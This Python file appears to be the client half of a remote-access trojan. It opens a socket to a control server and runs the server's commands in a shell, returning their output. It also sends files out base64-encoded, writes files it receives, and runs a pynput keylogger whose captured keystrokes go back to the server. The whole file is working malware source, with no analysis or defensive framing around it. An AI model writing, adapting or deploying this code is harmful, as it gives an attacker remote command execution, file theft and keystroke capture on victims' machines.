import socket
import subprocess
from sys import stdout
from pathlib import Path
from pynput.keyboard import KeyCode, Listener
import threading
import base64

#global allkeys
allkeys = ''
keylogging_mode = 0
def pressed(key):
    global allkeys
    allkeys+=str(key)

def released(key):
    pass


def keylog():
    #global l
    l = Listener(on_press=pressed, on_release=released)
    l.start()

# def download_file(filename):
#     print('Path', Path(filename))
#     f = open(Path(filename), 'rb')
#     contents = f.read()
#     f.close()
#     cs.send(contents)
#     msg = cs.recv(1024)
#     return(msg)

# def upload_file(filename,filesize):
#     f = open(Path(filename), 'wb')
#     contents = cs.recv(filesize)
#     f.write(contents)
#     f.close()
#     cs.send('File recieved successfully'.encode())
#     msg = cs.recv(2048)
#     return(msg)


ip_address = '127.0.0.1'
port_number = 1234

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip_address,port_number))

msg = 'TEST CLIENT'

cs.send(msg.encode())
msg = cs.recv(1024).decode()

while msg!= 'quit' :
    fullmsg = msg
    msg = list(msg.split(' '))
    if msg[0] == 'download':
        filename = msg[1]
        print(filename)
        
        f = open(filename, 'rb')
        contents = f.read()
        encoded_contents = base64.b64encode(contents)
        f.close()
        cs.send(encoded_contents)
        msg = cs.recv(1024).decode()
        # filler = download_file(filename)
        # print('Recieved',filler)
    elif msg[0] == 'upload':
        filename = msg[1]
        filesize = int(msg[2])
        # f = open(Path(filename), 'wb')
        # contents = cs.recv(filesize)
        # f.write(contents)
        # f.close()
        # cs.send('File recieved successfully'.encode())
        # msg = cs.recv(2048)
        #return(msg)
        contents = cs.recv(filesize)
        decoded_contents = base64.b64decode(contents)
        f = open(filename, 'wb')
        f.write(decoded_contents)
        f.close()
        cs.send('File recieved successfully'.encode())
        msg = cs.recv(1024).decode()
        #filler = upload_file(filename,filesize)
    elif fullmsg == 'keylog on':
        keylogging_mode = 1
        t1 = threading.Thread(target = keylog)
        t1.start()
        msg = 'keylogging has started'
        cs.send(msg.encode())
    elif fullmsg == 'keylog off':
        if keylogging_mode == 1:
            #l.stop()
            t1.join()
            #global allkeys
            cs.send(allkeys.encode())
            allkeys = ''
            msg = cs.recv(1024).decode()
        elif keylogging_mode == 0:
            msg = 'The keylogger is not running'
            cs.send(msg.encode())
            msg = cs.recv(1024).decode()

    else:
        p = subprocess.Popen(
            msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )
        output, error = p.communicate()
        if len(output) > 0:
            msg = str(output.decode())
        else:
            msg = str(error.decode())
        cs.send(msg.encode())
        msg = cs.recv(1024).decode()
        #print(msg)



cs.close()